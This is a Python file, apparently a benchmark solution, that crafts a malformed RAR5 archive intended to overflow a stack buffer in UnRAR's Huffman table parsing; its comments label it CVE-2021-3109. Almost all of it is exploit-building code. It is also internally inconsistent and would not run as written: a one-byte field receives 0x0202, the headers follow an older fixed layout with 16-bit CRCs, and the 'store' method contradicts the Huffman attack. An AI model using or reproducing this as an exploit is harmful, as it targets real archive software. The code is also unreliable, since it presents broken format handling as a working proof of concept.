import struct
import os
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 file structure for CVE-2021-3109 (UnRAR stack buffer overflow)
        # Craft a malicious RAR5 archive that triggers buffer overflow
        # during Huffman table parsing in RAR5 unpacker
        
        # RAR5 signature (8 bytes)
        signature = b'Rar!\x1a\x07\x01\x00'
        
        # Main archive header (type 1)
        # Header CRC32 (will be calculated later)
        header_crc = 0
        header_type = 1  # Main archive header
        header_flags = 0x0001  # Volume attribute (archive is continued from previous volume)
        header_size = 13  # Header size including this field
        reserved1 = 0
        reserved2 = 0
        
        main_header = struct.pack('<HBBHII', header_crc, header_type, header_flags, 
                                 header_size, reserved1, reserved2)
        
        # File header (type 3) - contains the vulnerable compressed data
        file_header_type = 3  # File header
        file_header_flags = 0x0202  # Has extended time field + directory + split before
        file_header_size = 32  # Size of this header
        
        # Compressed size and uncompressed size
        # We'll make the compressed size large enough to trigger overflow
        compressed_size = 524  # Ground truth length suggests this size
        uncompressed_size = 0x1000  # 4KB
        
        # OS (0 = Windows, 1 = Unix)
        file_os = 0  # Windows
        
        # File CRC32
        file_crc = 0x12345678
        
        # File modification time
        file_time = 0x00000000
        
        # File version
        file_version = 5  # RAR version
        
        # Method (0x30 = store, 0x31 = fastest, 0x32 = fast, 0x33 = normal, 0x34 = good, 0x35 = best)
        # We use store method (0x30) to directly control the data
        method = 0x30
        
        # Name size (filename length)
        name_size = 4  # "test" filename
        filename = b'test'
        
        # Extra area size for extended time field
        extra_size = 9  # Extended time field size
        
        # Build file header
        file_header = struct.pack('<HBBHIIBBIIBH', 0, file_header_type, file_header_flags,
                                 file_header_size, compressed_size, uncompressed_size,
                                 file_os, file_crc, file_time, file_version, method,
                                 name_size)
        
        # Add filename
        file_header += filename
        
        # Add extra area (extended time field)
        # Extra record header: size (2 bytes) + type (2 bytes) + flags (2 bytes)
        extra_record_size = 9  # Total extra record size including header
        extra_record_type = 0x1001  # Extended time field
        extra_record_flags = 0x0002  # Windows file time
        
        # Windows FILETIME structure (8 bytes)
        filetime = 0x01D0000000000000
        
        extra_area = struct.pack('<HHHQ', extra_record_size, extra_record_type,
                                extra_record_flags, filetime)
        
        file_header += extra_area
        
        # Now create the malicious compressed data that triggers the buffer overflow
        # The vulnerability is in the Huffman table parsing where a buffer of size
        # 306 bytes (NC constant) can be overflowed
        
        # We need to create RAR5 compressed block data that will trigger
        # the overflow when parsing Huffman tables
        
        # RAR5 compressed block structure:
        # 1. Block type and flags
        # 2. Huffman table data that causes overflow
        
        # Create malicious Huffman table data
        # The overflow happens when reading Huffman table lengths
        # We need to provide length data that exceeds the buffer
        
        # First, let's create what appears to be valid compressed data
        # but with manipulated Huffman table
        
        # Block header for compressed data
        # Block type: 0x01 (compressed)
        # Block flags: various
        block_header = bytearray()
        
        # We'll create a minimal valid RAR5 compressed block first
        # and then corrupt the Huffman table data
        
        # Start with a simple approach: create data that will overflow
        # the stack buffer when ReadTables() processes it
        
        # The vulnerable code path is in ReadTables() function where
        # it reads Huffman table codes without proper bounds checking
        
        # We'll create a Huffman table with excessive data
        # First, create table with 306+ elements to overflow
        
        # Compressed block data structure:
        # - Block type and size
        # - Huffman table for literal/match lengths
        # - Huffman table for distances
        # - Actual compressed data
        
        # We'll focus on corrupting the Huffman table
        
        malicious_data = bytearray()
        
        # Add block type and flags
        # Block type 0x01 (compressed data) with some flags
        malicious_data.append(0x81)  # Block type 1 with some flags
        
        # Block size (will be calculated)
        block_size_pos = len(malicious_data)
        malicious_data.extend(b'\x00\x00')  # Placeholder for size
        
        # Now add corrupted Huffman table data
        # The vulnerability: when reading table lengths, it doesn't check
        # bounds properly. We need to provide length data that causes
        # buffer overflow in the Table[] array (size NC = 306)
        
        # First, create what looks like valid table length data
        # but with values that will cause overflow
        
        # We need to trigger the overflow in the loop that reads
        # Huffman table codes. The overflow happens when Index > NC
        
        # Create table with more than 306 entries
        table_entries = 400  # More than NC (306)
        
        # Start with some valid-looking data
        # Then add excessive entries
        
        # First 20 bytes: normal table data
        for i in range(20):
            malicious_data.append(i % 10)
        
        # Now add data that will cause overflow
        # The code reads a byte, interprets it as length
        # If it's 0, it skips some entries
        # If it's 15, it reads a count and repeats
        
        # We'll create a pattern that causes many entries to be written
        # Use code 15 (repeat count) with high count values
        
        # Add code 15 with count that causes overflow
        malicious_data.append(15)  # Code 15 means repeat
        malicious_data.append(200)  # Repeat count - large enough to overflow
        
        # Value to repeat
        malicious_data.append(1)  # Length value
        
        # Add more data to reach total size
        remaining = compressed_size - len(malicious_data) - 2  # Account for size field
        malicious_data.extend(b'A' * remaining)
        
        # Update block size in the data
        block_size = len(malicious_data) - block_size_pos - 2
        malicious_data[block_size_pos:block_size_pos+2] = struct.pack('<H', block_size)
        
        # Now calculate CRC32 for file header
        # Simple CRC32 calculation (not optimized for speed)
        def calculate_crc32(data, crc=0xFFFFFFFF):
            for byte in data:
                crc ^= byte
                for _ in range(8):
                    if crc & 1:
                        crc = (crc >> 1) ^ 0xEDB88320
                    else:
                        crc >>= 1
            return crc ^ 0xFFFFFFFF
        
        # Update CRC32 in file header
        file_header_crc_data = file_header[2:]  # Skip first 2 bytes (CRC placeholder)
        file_header_crc = calculate_crc32(file_header_crc_data)
        file_header = struct.pack('<H', file_header_crc & 0xFFFF) + file_header[2:]
        
        # Update CRC32 in main header
        main_header_crc_data = main_header[2:]  # Skip first 2 bytes
        main_header_crc = calculate_crc32(main_header_crc_data)
        main_header = struct.pack('<H', main_header_crc & 0xFFFF) + main_header[2:]
        
        # Build final RAR5 archive
        rar_data = bytearray()
        rar_data.extend(signature)
        rar_data.extend(main_header)
        rar_data.extend(file_header)
        rar_data.extend(malicious_data)
        
        # Ensure total size is exactly 524 bytes (ground truth)
        if len(rar_data) < 524:
            # Pad with null bytes
            rar_data.extend(b'\x00' * (524 - len(rar_data)))
        elif len(rar_data) > 524:
            # Truncate to exact size
            rar_data = rar_data[:524]
        
        return bytes(rar_data)